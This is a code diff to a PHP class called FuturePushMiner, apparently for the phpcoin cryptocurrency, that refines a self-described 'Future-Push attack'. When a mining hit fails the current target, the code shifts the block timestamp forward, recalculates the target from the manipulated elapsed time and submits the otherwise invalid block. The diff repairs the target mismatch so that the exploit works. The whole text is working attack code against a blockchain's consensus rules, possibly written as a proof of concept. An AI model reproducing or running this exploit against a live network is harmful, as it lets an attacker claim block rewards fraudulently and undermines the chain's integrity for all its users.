@@ -131,13 +131,16 @@ class FuturePushMiner extends Miner
 
                 $blockFound = ($hit > 0 && $future_target > 0 && $hit > $future_target);
 
-                if ($blockFound && !($hit > $target)) {
-                    echo PHP_EOL . "[+] Found a block with a normally INVALID hit: $hit (target: $target)" . PHP_EOL;
+                $original_target = $target;
+
+                if ($blockFound && !($hit > $original_target)) {
+                    echo PHP_EOL . "[+] Found a block with a normally INVALID hit: $hit (target: $original_target)" . PHP_EOL;
                     echo "[+] This hit IS valid for a future-pushed block (future target: $future_target)" . PHP_EOL;
                     echo "[+] Starting Future-Push attack..." . PHP_EOL;
 
                     $new_block_date = time() + $slipTime;
                     $elapsed = $new_block_date - $block_date;
+                    $target = $bl->calculateTarget($elapsed); // Recalculate target for submission
 
                     echo "[+] Manipulated elapsed time: $elapsed" . PHP_EOL;
                     echo "[+] Manipulated block date: " . date("r", $new_block_date) . PHP_EOL;
@@ -197,8 +200,9 @@ class FuturePushMiner extends Miner
             echo "----------------------------------------------------------------" . PHP_EOL;
             echo "Block Found & Submitting with Future-Push:" . PHP_EOL;
             echo "  - Hit:                 " . (string)$hit . PHP_EOL;
-            echo "  - Original Target:     " . (string)$target . " (INVALID)" . PHP_EOL;
+            echo "  - Original Target:     " . (string)$original_target . " (INVALID)" . PHP_EOL;
             echo "  - Future Target:       " . (string)$future_target . " (VALID)" . PHP_EOL;
+            echo "  - Final Submitted Target:" . (string)$target . PHP_EOL;
             echo "  - Slip Time:           " . $slipTime . " seconds" . PHP_EOL;
             echo "  - Manipulated Elapsed: " . $elapsed . PHP_EOL;
             echo "  - Final Timestamp:     " . date("r", $new_block_date) . PHP_EOL;
@@ -211,10 +215,10 @@ class FuturePushMiner extends Miner
                 'difficulty' => $difficulty,
                 'address' => $this->address,
                 'hit' => (string)$hit,
-                'target' => (string)$future_target,
+                'target' => (string)$target,
                 'date' => $new_block_date,
                 'elapsed' => $elapsed,
-                'minerInfo' => 'phpcoin-miner cli ' . VERSION,
+                'minerInfo' => 'phpcoin-miner cli ' . MINER_VERSION,
                 "version" => MINER_VERSION
             ];
 
